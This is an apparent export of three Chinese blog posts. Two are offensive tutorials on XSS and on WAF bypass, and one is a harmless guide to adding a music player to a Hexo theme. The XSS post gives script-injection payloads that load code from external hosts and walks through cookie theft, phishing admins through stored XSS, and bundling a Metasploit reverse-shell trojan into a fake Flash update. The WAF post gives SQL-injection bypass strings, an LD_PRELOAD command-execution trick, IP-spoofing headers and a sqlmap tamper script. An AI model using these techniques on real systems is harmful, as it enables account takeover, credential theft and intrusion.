[{"title":"XSS跨站漏洞","url":"/2024/12/14/XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/","content":"\n存在xss漏洞的站点：\n企业站点\n测管理员经常上线的站点\n借助社工 让管理员登录后台触发漏洞\n利用：\ncookie盗取 欺骗管理员身份登录后台\n钓鱼\n黑帽seo js代码\n快照劫持 页面跳转 蜘蛛劫持 钓鱼 等一系列攻击\n根目录/首页 head头标签里面的script代码\n\n 跨站脚本的实例：\n\n\n XSS分类\n 反射型XSS\n\n\n 存储型XSS\n\n\n DOM型XSS\n\n XSS漏洞挖掘\n 手工挖掘XSS\n\n\n\n闭合\n&lt;td&gt;123&lt;/td&gt;#插入的内容：123&lt;/td&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;td&gt;123&lt;/td&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/td&gt;这么一来就把前面的标签闭合了\n比如说我们找到了一个可以注入的地方，可以先看一眼前端代码来确定一下他的闭合方式，然后来绕过\n\n\n\n长度限制\n\n\n长度限制（前台限制）\n修改表单长度（maxlength）、burp抓包修改\n\n\n后台服务器/代码限制\n这种只能缩短代码长度\n&lt;script src=http://xssye.com/sluJ&gt;&lt;/script&gt; &lt;!-- 如何将其缩短？1. &lt;script src=http://xssye.com/sluJ&gt;2. &lt;script/src=//xssye.com/sluJ&gt;如果想要继续缩短的话，就可以使用 URL短网址\n\n\n\n\n防护（代码防护、waf 防护）\n前后台标签不一致：可以通过前台标签推理后台标签\n如果不知道后台标签的情况下，可以尝试盲闭合（把所有的情况都写一遍）：\n&#x27;&quot;/&gt;&lt;/tr&gt;&lt;/td&gt;&lt;/div&gt;&lt;/li&gt;&lt;/textarea&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;!-- 闭合单引号、双引号还有标签啥的 --&gt;\n\n\n通用型防护\n根据防护的位置方式方法\n&lt;s&lt;x&gt;cript/src=//t.cn/sluJ&gt;&lt;/sc&lt;x&gt;ript&gt;&lt;!-- 这种要防护的话就得找黑名单之外的标签调用了，简单一点的可以双写啥的去绕过 --&gt;&lt;script/**/src=//t.cn/sluJ&gt;&lt;!-- 使用内联注释绕过\ncsp 防护：不允许调用外部的 js 进行执行，可以借助一些 fram 标签来过滤掉\n\n\nwaf防护（d盾、360、云锁）\n&lt;script/src=//xssye.com/sluJ&gt; &lt;!-- 这种可以过云锁 --&gt;\n\n像这种，使用了 img 标签，然后 src 指定一个 x，这样一定会报错，一旦报错就会执行后面的 eval 命令（这里过滤了script）\n里面的 atob 使用来解码 base64 的\n\n\n\n\n\n位置问题\n挖掘的位置：\n\n\n反射型XSS\n搜索框、URL参数位置、挖掘你提交的内容在页面中有回显的地方\n\n\n存储型XSS\n可以写入数据库中的，并且会被调用\n\n\n留言\n\n\n注册（用户名，个人资料，支付宝，微信，备注，留言，银行卡信息）\n\n\n登录（用户名、管理后台 登录账号会有登录日志 ==&gt; lvycms3.0漏洞、client-ip、x-forwarded-for、请求头）\n\n\n修改资料、提交工单、打款备注、订单系统（备注位置存在很多）\n\n\n\n\n\n\n XSS 的编码\n\n html实体编码\n\n\n将上述代码进行编码（HTML转义）：\n\n我们将转义之后的编码直接写到 html 文件里面运行，查看运行结果\n\n可以看到直接被解码然后输出出来了，并没有被运行（解一次码，然后当做字符串输出），那我们应该怎么写？\n可以单纯将内容进行编码，不对标签进行编码\n\n\n再次访问发现图片可以被显示出来了（所以不可以把整条语句都进行编码，只编码值就可以）\n\n那我们再进行一下测试，这次我们把 src=也进行编码，看看结果如何\n\n\n\n\n所以我们要对这种进行html实体编码同时要可以运行：\n\n从属性的值开始编码，要留下属性的名称，比如：src=\n不能把属性进行编码，也不能直接把整个标签全部进行编码\n\n\n 进制类编码\n\n\n对需要执行的代码进行编码，其他的地方不要乱编码\n\n Unicode 编码\n\n\n在反射型 URL 当中可以尝试 Unicode 编码\nJS 代码加密：如果 WAF 拦截代码的话\n可以尝试进行双重编码，比如 JS+html 编码\n\n 工具挖掘\n\nAWVS、burp、OWASP、BruteXSS\n\n XSS cookie 盗取\n可以使用盗取到的cookie直接登录到目标网站\n 存储型XSS盗取cookie\n我们先找到一个可以上传的地方，同时上传的最终地点是数据库，比如留言板，然后在留言的位置直接插入XSS代码，但是要注意尝试闭合，比如留言的位置就可以使用  标签进行闭合，然后其他位置可以查看前端代码来猜测应该使用什么标签进行闭合，然后那种有长度限制的，比如这里的QQ还有邮箱，我们就可以尝试直接抓包来修改长度限制。\n\n然后我们进入到管理员后台进行查看\n\n\n标签闭合成功，代码成功执行，然后我们返回到一个 XSS 平台进行查看\n\n可以看到返回了一个管理后台的地址以及管理员cookie，这个时候我们就可以尝试 cookie 注入了，进入到管理员的后台管理系统，使用刚刚劫持到的cookie直接伪造成管理员的身份进行登录，绕过登录【其中这个的管理员地址以及cookie的传播过程会被捕捉到，可以直接在网络里面进行查看】\n\n\n 反射型XSS盗取cookie\n将 XSS 代码插入到 URL 当中，只要诱导管理员点击这个 URL 就可以拿到管理员的 cookie\n\n但是这种 URL 一眼就可以看出来是带有XSS的，所以我们需要伪造一下，比如：发送一个页面，就类似下面这种：上面的页面输入正常页面，然后插入一张图片对应的 SRC 是一个反射型 URL，然后我们将这个 HTML 页面使用邮箱发送给受害者，一旦受害者打开这个 HTML 页面，我们就可以在XSS平台接收到他的 cookie\n\n\n建立session会话控制：\ncookie 是有有效期的，一般是7天或者是1个月，如果管理员修改了密码，那么cookie就会失效，我们可以设置一个短信提醒，提前进入到管理员后台，将 cookie 换为 session，这样就算 cookie 被修改了也可以维持登录状态\n保持 session：理论上，只要我们不退出后台，session就会一直有效，但是像安全狗这种类型的WAF他会强制设置session为30分钟有效期，时间一过就会强制退出重新登录\n我们可以使用鼠标点击器来重复上述的点击操作，然后想要使用的话就 F7 退出进行操作\n\n\nhttp-only 只读cookie\nawvs：如果没有启用就会报一个中危漏洞\n一旦被启用的话，就只能打到管理员后台（会返回一个地址），返回的cookie没有用或者返回为空（打不到cookie）\n\n http-only 启用时的攻击\n\n\n启用了 http-only，我们无法获取cookie\n\n\n钓鱼（ 通过伪造管理员后台盗取管理员账号 ）\n\n我们使用客户端浏览器将代码植入到目标网站的后台里面，管理员登录到后台之后触发代码就会弹出一个登录界面，这个界面就是我们使用VPS搭建的一个钓鱼页面，管理员一旦登录，我们就可以获取到他的账号以及密码，然后这些信息会保存到我们VPS的数据库当中\n这里介绍一个工具 httrack，这个工具可以用来下载网站上的一些源码（通过网站的 URL 来下载），使用这个是为了防止不同操作系统之间的编码问题导致的乱码问题（这个工具可以直接在 kali 上使用）\n【钓鱼实例】\n\n\n首先我们使用 httrack 工具将要攻击的网站的源码下载下来，然后利用这些前端源码，将网站搭建在我们的 VPS 上面，这里我们在本地测试一下，使用小皮搭建一个站点进行测试\n\n\n将下载好的源码放到小皮的根目录下，之后我们需要修改一些参数，比如跳转的地址以及数据库的name\n\n\n\n\n然后我们还需要两个php文件，一个是index.php，一个是tz.php文件\nindex.php 文件：\n\n这个文件的主要内容就是他会接收两个参数，一个 username 和一个 password，同时会将这两个参数保存到一个admin表里面，这个表有两列，一个是 username列，一个是 password列，然后开头是一个连接数据库的命令，就是本地的数据库（如果有 VPS 就修改成 VPS 的地址），然后是数据库的账密以及指定的数据库 dd。总结就是会将接收到的账密发送到指定的数据库当中。注意开头还 include了一个 tz.php\ntz.php 文件：\n用来让管理员跳转到真正的后台地址的\n\n\n\n然后就是最重要的一步，我们怎么才可以将这个钓鱼页面上传到目标的后台，这个时候就可以利用存储型XSS\n\n\n\n\n然后我们切换到管理员视角，我们先进入到管理员后台\n\n一点击这个等审留言就会跳转到钓鱼页面\n\n然后管理员就会进行登录，这个时候账密就会被传输到 VPS 的数据库上面，然后页面再次跳转，跳转到管理后台登录的首页，但是管理员只会认为需要重复登录，然后登录成功就会进入到后台页面\n\n然后我们查看一下VPS的数据库，可以看到账密已经被记录下来了\n\n\n\n当然我们也可以直接使用 XSS 平台来实现这种效果，就是将最后那个Windows跳转的代码写入到一个模块里面，然后创建一个项目引用这个模块\n\n\n\n钓鱼（合成flash -更新升级exe程序来获取管理员pc权限）【难点：免杀以及伪造】\n思路：下载一个flash升级页面\n\n伪造一个flash的升级页面，想办法让他跳转到这个页面下载flash，然后我们将正常的flash软件和我们的木马进行捆绑，只要他下载升级了，我们的木马就会运行（给木马做一个免杀）\n\n\n首先我们需要使用 MSF 生成一个反弹 shell 的 exe 可执行文件（木马 =&gt; 记得给木马做一个免杀）\n\n\n\n开启监听\n\n\n\n\n使用 httrack 下载 flash 的页面，方便后序进行钓鱼\n\n其他的都做的一模一样了，唯一需要修改的就是这些参数还有这个立即下载的样式，这个就是前端的东西了，还有就是点击下载之后会跳出一个flash.exe文件的下载，这个我们也要根据原版的样式进行模拟，然后我们可以注册一个 flash.top 这种类似的域名，和我们的 VPS 绑定一下，还有就是要修改一下网站的 icon\n\n\n然后就是将 flash的那个软件和我们的木马进行捆绑\n\n我们只需要创建一个自解压格式的压缩文件，然后修改一下压缩文件的名称就可以，他会自动生成exe类型的文件\n然后我们还需要修改一下他的设置\n\n\n\n\n最后我们只需要修改一下这个新生成的文件的图标就可以\n\n\n然后就是钓鱼用的XSS代码，我们只需要将最后的地址修改为我们VPS的地址就可以\n\n使用上述的代码在XSS平台创建一个模块，然后利用这个模块创建一个项目，之后利用生成的XSS代码进行钓鱼\n\n\n我们将上面生成的XSS代码插入到留言板里面，当管理员访问后台的时候就会跳转\n\n然后我们点击立即下载，可以看到下载成功了\n\n然后我们点击运行，可以看到 flash 的软件以及木马都被执行了，后台的会话也成功建立了\n\n\n\n\n\n\n\n\n\n beef-XSS\n参考文章：beef-xss详细教程\n\n我们需要利用上述的XSS代码进行测试，将他放到留言板插入到数据库当中\n\n\n进入到管理页面可以看到XSS已经被执行了，然后我们去管理面板看看有没有上线，可以看到已经成功上线了，然后就可以进行一系列操作了，比如：可以获取到管理后台的表单、管理员的cookie、超链接等等\n\n\n\n这个时候问题来了，这个 beef-xss 只能在我们本地 kali 运行起来，所以利用的地址也是我们本地的，那要怎么拿去钓鱼呢？可以使用 ngrock 进行代理转发\n我们只需要修改一下beef的配置文件，将端口修改为 ngrock 转发到本地的端口，然后我们就可以利用 ngrock 给的公网的地址进行钓鱼了\n\n\n XSS平台的搭建\n参考文章：手把手教你搭建XSS平台_xss平台搭建-CSDN博客\n","tags":["web漏洞"]},{"title":"keep主题添加音乐播放器","url":"/2025/02/08/keep%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8/","content":" keep主题添加音乐播放器\n\n之前使用 wordpress 搭建博客的时候，一直都会使用音乐播放器，然后现在换成 Github 搭建博客了，依然有这个想法，但是在网上查了很长时间都没找到一篇完整的针对 keep 主题添加音乐播放器的文章，但是功夫不负有心人，我还是成功搞好了，但还是有一点小问题：切换页面的时候音乐播放器会重新加载，导致音乐无法继续播放，并且音乐也会被刷新，不过好在经过改进，播放器刷新的速度快了很多，所以影响不会太大\n\n首先，安装 APlayer 和 MetingJS 插件：\nnpm install aplayer --savenpm install hexo-tag-aplayer --save\n在 hexo 的配置文件添加：\naplayer:  enable: true  meting: true\n然后修改footer.ejs文件，在themes\\keep\\layout\\_partial\\footer.ejs文件中添加：\n&lt;!-- 保持播放器组件 --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css&quot;&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/pjax/pjax.min.js&quot;&gt;&lt;/script&gt;&lt;!-- 使用 id 来指定网易云歌单 ID，使用 class 作为播放器的唯一标识符 --&gt;&lt;meting-js    id=&quot;网易云歌单的ID&quot;         class=&quot;global-music&quot;      server=&quot;netease&quot;    type=&quot;playlist&quot;    fixed=&quot;true&quot;    autoplay=&quot;false&quot;    order=&quot;random&quot;    theme=&quot;#42b983&quot;    style=&quot;position: fixed; bottom: 20px; left: 20px; z-index: 9999;&quot;&gt;&lt;/meting-js&gt;\n至于网易云歌单的 id，大家可以在网页登录自己的网易云，找到自己的歌单，然后查看 URL，最后的 id 参数就是歌单 id\n然后在keep/source/css/style.styl中添加：\n.aplayer-fixed    z-index 9999 !important  // 确保播放器位于最上层    bottom 20px !important   // 调整播放器位置，防止被文章挡住\n这一步是确保音乐播放器位于最上层，这样无论翻到哪个位置，都可以点击到音乐播放器\n最后就是要修改一下自己的pjax.ejs文件，这个文件位于：keep\\layout_partial\\pjax目录下面：\n&lt;%- __js(&#x27;js/libs/pjax.min.js&#x27;) %&gt;&lt;script&gt;    window.addEventListener(&#x27;DOMContentLoaded&#x27;, () =&gt; &#123;        window.pjax = new Pjax(&#123;            selectors: [                &#x27;head title&#x27;,                &#x27;.page-container&#x27;,                &#x27;.pjax&#x27;            ],            history: true,            debug: false,            cacheBust: false,            timeout: 0,            analytics: false,            currentUrlFullReload: false,            scrollRestoration: false,        &#125;);        // 保存播放器状态        document.addEventListener(&#x27;pjax:send&#x27;, () =&gt; &#123;            KEEP.utils.pjaxProgressBarStart()            // 保存当前播放器状态            let oldPlayer = document.querySelector(&#x27;.global-music&#x27;);            if (oldPlayer) &#123;                let audio = oldPlayer.querySelector(&#x27;audio&#x27;);                if (audio) &#123;                    window.aplayerState = &#123;                        paused: audio.paused,                        currentTime: audio.currentTime,                        volume: audio.volume,                        songUrl: audio.src                    &#125;;                &#125;            &#125;        &#125;);        // 恢复播放器状态        document.addEventListener(&#x27;pjax:complete&#x27;, () =&gt; &#123;            KEEP.utils.pjaxProgressBarEnd()            // 恢复播放器状态            let newPlayer = document.querySelector(&#x27;.global-music&#x27;);            if (newPlayer &amp;&amp; window.aplayerState) &#123;                let audio = newPlayer.querySelector(&#x27;audio&#x27;);                if (audio &amp;&amp; audio.src === window.aplayerState.songUrl) &#123;                    audio.currentTime = window.aplayerState.currentTime;                    audio.volume = window.aplayerState.volume;                    if (!window.aplayerState.paused) &#123;                        audio.play();                    &#125;                &#125;            &#125;            window.pjax.executeScripts(document.querySelectorAll(&#x27;script[data-pjax], .pjax script&#x27;))            KEEP.initExecute()        &#125;);    &#125;);&lt;/script&gt;\n这一步其实是为了确保我点击其他页面的时候，播放器不会被刷新，音乐可以接着播放，然后试了一下没啥用，嘶，太难受了，这里将这个代码发出来是希望大家可以纠正一下，然后给一点优化的建议，感谢！！！\n既然无法保证切换页面的时候音乐不变，那就优化速度，下面是优化速度的代码：\n&lt;%- __js(&#x27;js/libs/pjax.min.js&#x27;) %&gt;&lt;script&gt;    window.addEventListener(&#x27;DOMContentLoaded&#x27;, () =&gt; &#123;        window.pjax = new Pjax(&#123;            selectors: [                &#x27;head title&#x27;,                &#x27;.page-container&#x27;,                &#x27;.pjax&#x27;            ],            history: true,            debug: false,            cacheBust: false,            timeout: 0,            analytics: false,            currentUrlFullReload: false,            scrollRestoration: false,        &#125;);        // 在页面切换时只刷新播放器组件        document.addEventListener(&#x27;pjax:send&#x27;, () =&gt; &#123;            KEEP.utils.pjaxProgressBarStart()        &#125;);        document.addEventListener(&#x27;pjax:complete&#x27;, () =&gt; &#123;            KEEP.utils.pjaxProgressBarEnd()            window.pjax.executeScripts(document.querySelectorAll(&#x27;script[data-pjax], .pjax script&#x27;))            KEEP.initExecute()            // 重新加载播放器组件，确保刷新速度快            let oldMeting = document.querySelector(&#x27;.global-music&#x27;);            if (oldMeting) &#123;                let newMeting = oldMeting.cloneNode();                oldMeting.parentNode.replaceChild(newMeting, oldMeting);            &#125;        &#125;);    &#125;);&lt;/script&gt;\n","tags":["博客优化"]},{"title":"waf绕过","url":"/2025/02/08/waf%E7%BB%95%E8%BF%87/","content":"\n网站的防护：\n\n\n源码自带的防护代码（注入、上传、XSS等存在拦截）\n\n\n软件WAF：\n各种 web 漏洞，提权组件，owasptop10，访问速度，指纹拦截\n安全狗、D盾、云锁、云盾、360等 waf\n比如说你使用 sqlmap 然后他识别了你的指纹 org ，那么即使你的注入语句可以过 waf，也会被拦截\n安全狗（你执行的注入语句被他检测出来之后会被拦截，但是不会封你 ip，当他认为你是cc攻击的时候才会封你 ip，那么什么是cc攻击？目录扫描速度过快，sqlmap跑注入速度过快都会认为你是cc攻击，一般1秒钟访问超过10次就会封你，一般每次封锁的时间为5分钟）\n\n\n硬件WAF：\n主要防御流量和一些web攻击\n比如说天融信，一旦识别到你存在注入行为，他的防火墙就会直接封你 IP\n阿里云的硬件 waf 不光会拦截 web 漏洞攻击，就连速度过快的 ddos 也会被拦截，一封就是1h\n\n\n云WAF\n\n\n\n\n一定要注意软件的指纹信息清理或者修改\n封锁 IP有两种方式，一种是通过 http 请求，还有一种是通过 TCP 获取 ip 来封锁的（硬件 waf 常见）\n\n如果是通过 http 请求头来获取 IP 封锁的，那我们就可以通过插件fakeip修改client-ip或者x-forward-for等来绕过\n用代理（换IP来访问），这个时候就引入了代理池\n\n\n\n\nwaf 拦截的两个方向：\n\n基于 ip 封锁（cc 攻击、ddos 等态势感知）\n基于 web 应用攻击（web 漏洞攻击拦截，指纹）\n\n通用型防护代码：注入、上传、XSS等地方，针对注入：\n\n大小写替换\n变换提交方式（get、post、cookie）\n编码绕过（url 编码，基于语句重叠，添加注释符号等等）\n\n\n WAF 防护原理讲解\nd盾拦截注入、上传、webshell、菜刀等等拦截的很厉害\n下面这个我们在执行注入的时候被拦截了，然后看这个大E，这个就是安全狗\n\n\n宝塔的 waf：ngx_lua_waf ，这个 waf 的拦截页面和安全狗很相似，但是没有这个大e\n\n 目录扫描绕过waf\n目录扫描被封锁的原因：1. 指纹    2. 速度，如果速度过快还会被封锁 IP\n那么我们先来解决第一个问题，也就是指纹的问题，我们可以尝试更换指纹，比如在Dirbuster目录扫描工具里面，我们可以通过修改User Agent头来修改指纹，这样就可以绕过一些 waf\n\n然后就是第二个速度的问题，因为速度过快会被防火墙封锁 ip，所以我们可以尝试减慢扫描的速度，但这样的话就比较难受了，因为目录扫描就是需要速度，所以我们可以尝试使用代理池来绕过，搞一个代理池，假如说里面有十万个代理 IP，验证看看那些 IP 可以访问目标，然后使用这些验证后的挨个访问目标，如下：\n\n刚刚测试了一下那个 proxypool 的免费代理池工具，真就狗屎，用不了一点，一个 ip 都用不了，不如 glider\n当然有一些是通过识别 http 请求来识别 IP，我们就可以尝试通过修改client-ip等参数来进行绕过\n 禁用命令执行函数\n如果我们发现目标会禁用我们使用命令执行函数来执行命令的话，可以编写一个 C 程序，然后程序里面写上要执行的命令，比如我们现在编写一个 hack.c文件，文件内容如下：\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;    system(&quot;rm /tmp/check.txt&quot;);&#125;int geteuid() &#123;    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;\n然后我们就可以对这个文件进行编译：\ngcc -c -fPIC hack.c -o hack.ogcc -shared hack.o -o hack.so\n之后将得到的动态库文件上传到 webshell 上，然后写一段简单的 php 代码，用来调用这个库文件：\n&lt;?php\tputenv(&quot;LD_PRELOAD=/var/www/hack.so&quot;);\tmail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);?&gt;\n在浏览器中打开就可以执行它，然后再去检查新建的文件是否还存在，找不到文件则表示系统成功执行了删除命令，也就意味着绕过成功，测试中注意修改为实际路径。\n 访问受限绕过\n就比如我们访问到了一个网站的后台/admin，但是页面回显为：403、501、500、401（未授权）等等，这种的话，我们第一步需要去探测它是通过 tcp ip的限制还是通过 http 来限制的，如果是http，那我们直接上插件，然后修改下面的这些参数：\nX-Forwarded-For:134.27.38.209X-Forwarded-Host:134.27.38.209X-Client-IP:134.27.38.209X-remote-IP:134.27.38.209X-remote-addr:134.27.38.209True-Client-IP:134.27.38.209X-Client-IP:134.27.38.209Client-IP:134.27.38.209X-Real-IP:134.27.38.209\n我们可以将这些参数后的 IP 修改为目标管理员的 ip 来绕过一些限制，比如后台限制 IP 的时候就可以这样去绕过\n\n\n实例突破后台 ip 限制：\n就比如我们使用 XSS 打过来之后，使用插件修改 ip 为目标管理员 ip（前提是目标通过 http 请求来限制 IP）\n如果目标的 IP 是外网的某一个段的（比如某一个地区：浙江），并且使用的是 tcp 来验证，这个时候插件就不管用了，就得使用代理池，我们可以在一些代理网站里面看看有没有一个段的 IP 来进行突破\n\n\n还有访问 3389 端口，目标只允许某一个特定的 IP 访问，也就是对 IP 进行了封锁（401、403、501这些都是对 IP 进行了封锁），这个时候我们就可以通过端口转发来解决突破，比如可以使用lcx将端口转发到我们的 vps 上面，然后直接连接 vps 的端口即可，当然也可以使用 msf，在建立连接之后，使用 portfwd add 来实现端口转发\n 手工注入绕过 waf\n我们先搭建一个有着注入以及 waf 的网站，然后先尝试注入and 1=1，可以看到直接被拦截了，并且是安全狗\n\n然后我们介绍几种绕过的方法：\n\n大小写变种\n使用SQL注释\n使用URL编码\n使用空字节\n使用嵌套过滤剥离\n使用非标准入口点\n避开自定义过滤器\n\n下面是一些数据库以及相关的注释符和空白字符：\n\n\n\n数据库系统\n注释符\n空白字符\n\n\n\n\nMySQL\n- # （单行注释）- -- （注意后面需跟随一个空格或其他字符，单行注释）- /* ... */（多行注释）\n%09（水平制表符）%0A（换行符）%0B（垂直制表符）%0C（换页符）%0D（回车符）%20（空格）\n\n\nOracle\n- --（单行注释，后需跟空格或其他字符）- /* ... */（多行注释）\n%00（NULL字符）%09（水平制表符）%0A（换行符）%0B（垂直制表符）%0C（换页符）%0D（回车符）%20（空格）\n\n\nMSSQL\n- --（单行注释，用法与上述相同）- /* ... */（多行注释）\n%00至%20（包括NULL字符在内的所有ASCII空白字符）\n\n\n\n然后这里面比较有用的一个方法就是注释：\n\n\nURL 参数污染\n\n\n可以用注释和空字符和内联注释来进行污染\n这里要注意的是这些注释必须是被目标系统支持的，然后就是污染，比如说我们使用 %0a 来进行污染，我们可以使用%%%%%%%%%%0a这种来代替空格，可以正常运行，并且可以过宝塔、WTS\n上面的 这些空白字符都可以用来代替空格 进行绕过，当然也可以使用+来代替，这个能过 360\nMysql 用的比较多的就是：--、#、%23、/* */、/*!50001 */\n内联注入：/*!select version()*//*!select*/ version(); 这里面的 select 是可以起作用的，因为加入了! 表示非注释/*!10000select*/ version(); 这条语句也是可以执行的，数字最好是 5 位的，就比如下面这个就是用 44444 过掉的，这个网站用的 waf 是安全狗\n\n\n\n然后就是上面这个，我们解释一下：在 union后面加上一个%23 也就是注释符，将后面全部注释之后页面回显了网站的CMS，但是下面没有内容，因为是单行注释，所以我们再后面加上一个换行%0a，这么一来就可以正常回显了，那么问题来了，为什么不在数字这一块发力，因为给每一个数字包裹很费时然后就是不管如何处理都会被拦截，所以才将目光转向了 union 和 select 中间，emmm，反正就是多测试几个位置\n上面这里测试后可以得出这个 waf 主要拦截的就是union select，所以我注释换行就绕过了\n然后就是爆破数据库：\n\n我们可以在回显位写上database，但是被拦截了，那就在后面加上一个%23%0a，先单行注释，然后换行\n之后就是爆破数据表：\n\n这里就很简单了，只是对表名进行了十六进制编码，然后列名也是一样，如下：\n\n最后直接爆破出账密：\n\n上面使用的 waf 是安全狗，然后我们换成 D 盾看看怎么个事\n\n\n可以看到绕过了，绕过的方法也很简单，在/**/里面随便加上一些字符，然后加上一个&amp;lt;，然后将他进行URLencode，编码之后为：%26lt%3B 最后用这个整体来代替空格使用\n\n\n使用长度来进行污染，可以使用垃圾字符来增加提交内容的长度，就比如说我们再进行注入的时候，可以加上一些不会影响结果的参数，然后多写几个，类似于：?id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1 ，这里要注意的是 waf 拦截的长度是有一定的限制的，太长的话可能会导致内存溢出\n长度污染一般是用在 post 提交或者上传的时候\n\n\n\n然后我们总结一下手工注入过 waf 的一些方法：\n\n\n注释，内联注释，空白字符，脏数据，当行注释，换行符等等\n在 mysql 中：\n\n/*asdasd*/\n/*!union*/：这个因为加上了！所以里面的union是可以执行的\n/*!44444and*/：这里面是加入了数字，用来绕过一些过滤，但是里面的and是可以执行的，并且因为整体是一个注释符，所以连接下一个的时候中间不需要加任何空白字符\n%23：这个其实就是#，因为是单行注释，所以可以配合%0a换行符来使用\n-- 和 --+\n\n然后是 access+asp 里面，使用空白字符替换空格的方法如下：\n\n可以使用%0a（换行）、%0d（回车）、%09（Tab）\n还可以使用 %%%%%%%%%0a 这种重复的%，通过不断加长来超过 waf 的拦截长度，这种可以绕过 wts-waf、宝塔自带的 asp 的 access 拦截的 waf，但是要注意的是也不能太长，太长服务器可能就不会接受了，所以这种方法一般是用在 post 传参里面的，因为 post 传参可以接受的长度远远大于 get 传参\n使用+ 替换，同时可以加上一定的大小写绕过，比如说：+anD+1=1 这种方法可以过掉 360\n\n\n\n变换提交方式（get、post、cookie）\n但是这个也要注意一点，那就是服务器是否允许你通过其他传参方式提交\n然后就是在access+asp 的站点，安全狗会把 post 提交的语句中间的空格替换为空，比如说：and 1=1会被变为and1=1 这个时候该如何绕过：可以使用%0a也就是换行符或者是+来代替空格\n\n\n进行编码（一般是URLencode）或者是大小写绕过，但是这里要注意：因为我们使用空白字符绕过的时候，用的就是URL编码之后的，所以我们再次编码之后服务器可能就无法解析了，因为大部分服务器只进行一次解码\n所以在存在空白字符的时候，尽量不要使用 URLencode\n\n\n说了这么多绕过的方法，但其实最重要的还是灵活的组合应用，比如说我们使用%0a来代替空格，但是可能无法绕过，那就试着组合一下，比如说将 get 请求转换为 post 请求，然后使用%%%%%%0a来代替空格，之后再加入大小写，这样说不定就可以绕过一些 waf，所以打组合拳很重要\n\n\n\n但是这个时候问题又来了，那就是使用手工注入的话，效率太低了，所以还是得用工具，这里就用 sqlmap来举例，就比如我们刚刚测试的安全狗，我们刚刚是已经成功手工绕过了，方法：/*!44444union*/ 将我们的语句加入到内联注释里面来进行绕过，那么这个时候，我们就可以将这个经验写成脚本，当然不用我们自己重新手搓一个脚本，我们只需要将他自带的脚本修改一下即可，当然现在已经有这个脚本了，但是我们需要培养这种思想：\n# modsecurityzeroversioned.pyimport osfrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMSfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.HIGHERdef dependencies():    singleTimeWarnMessage(&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))def tamper(payload, **kwargs):    &quot;&quot;&quot;    Embraces complete query with (MySQL) zero-versioned comment    Requirement:        * MySQL    Tested against:        * MySQL 5.0    Notes:        * Useful to bypass ModSecurity WAF    &gt;&gt;&gt; tamper(&#x27;1 AND 2&gt;1--&#x27;)    &#x27;1 /*!00000AND 2&gt;1*/--&#x27;    &quot;&quot;&quot;    retVal = payload    if payload:        postfix = &#x27;&#x27;        for comment in (&#x27;#&#x27;, &#x27;--&#x27;, &#x27;/*&#x27;):            if comment in payload:                postfix = payload[payload.find(comment):]                payload = payload[:payload.find(comment)]                break        if &#x27; &#x27; in payload:            retVal = &quot;%s /*!00000%s*/%s&quot; % (payload[:payload.find(&#x27; &#x27;)], payload[payload.find(&#x27; &#x27;) + 1:], postfix)    return retVal\n可以看到这个脚本的意思就是将 1 AND 2&gt;1-- 经过脚本转换为：1 /*!00000AND 2&gt;1*/--\n然后我们找一个比较老一点的脚本来看一看怎么转：\n\n可以看到这个脚本就是简单加了一个内联，里面没有数字，那我们就可以全局替换，将/*!转换为/*!44444 ，然后我们将这个保存为一个新的脚本：safi.py ，然后我们使用上面这个脚本跑一下目标脚本，这里是我们本地搭建的站点：\npython3 sqlmap.py -u &quot;http://192.168.0.200:8006/showproducts.php?id=13&quot; --flush-session --tamper=safi.py  # --flush-session：用来清缓存的\n跑出注入类型之后就可以直接使用--dbs参数来爆破数据库了，可以看到爆破成功了：\n\n然后这里我们又可以引进一个新的用来防止IP封锁的方法，那就是修改sqlmap工具里面的options.py文件，在这个文件里面将我们的ua头修改为百度的ua头，因为百度是在安全狗的白名单里面的，这样我们可以防止自己的 ip 被封锁\n 过D盾+安全狗的注入语句\n主要方法就是：/*SDJKF%26lt%3BSFDS*/ 代替空格过D盾，语句加入到内联注释过安全狗\n数据库名：\nhttp://192.168.0.200:8006/showproducts.php?id=-13/*SDJKF%26lt%3BSFDS*//*!44440union*//*SDJKF%26lt%3BSFDS*//*%23*/distinct%0a/*!44440%0aselect*//*SDJKF%26lt%3BSFDS*/1,database%23(%0a),3,4,5,6,7,8,9,10\n# 